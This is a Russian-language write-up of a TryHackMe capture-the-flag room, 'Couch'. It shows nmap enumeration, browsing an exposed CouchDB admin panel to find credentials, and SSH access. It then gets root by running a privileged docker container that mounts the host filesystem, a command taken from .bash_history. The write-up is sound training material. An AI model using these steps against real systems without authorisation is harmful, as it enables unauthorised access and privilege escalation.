# Couch

:white_check_mark:  [**Couchdb browsing**](#Couchdb_browsing)

___

## Enumeration
Сканируем ip командами:
```
nmap -Pn -p 1-10000 couch.thm (Для определения портов)

nmap -A -p 22,5984 couch.thm  (Для получения полной информации о портах)
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
|_  256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                           
```

<a name="Couchdb_browsing"></a>

Перейдем к базе данных CouchDB: http://couch.thm:5984. Нас встречает следующая строка:
```
{"couchdb":"Welcome","uuid":"ef680bb740692240059420b2c17db8f3","version":"1.6.1","vendor":{"version":"16.04","name":"Ubuntu"}}
```

Для того чтобы получить доступ к инстументу администрирования, перейдем по следующему пути:
```
http://couch.thm:5984/_utils
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Couch/1.png)

Мы можем заметить интересную базу данных "secret", перейдем в нее.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Couch/2.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Couch/3.png)

Мы находим пользовательские данные, попробуем подключиться по ssh.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Couch/4.png)

Прочитав .bash_history, можно обнаружить следующую строку:
```
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
```

На машине запускали docker. Попробуем ввести эту команду. Мы попадаем в docker. Для поиска финального флага воспользуемся командой find.
```
find / -type f -name root.txt 2>/dev/null
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/Couch/5.png)

Переходим в директорию и получаем финальный флаг.
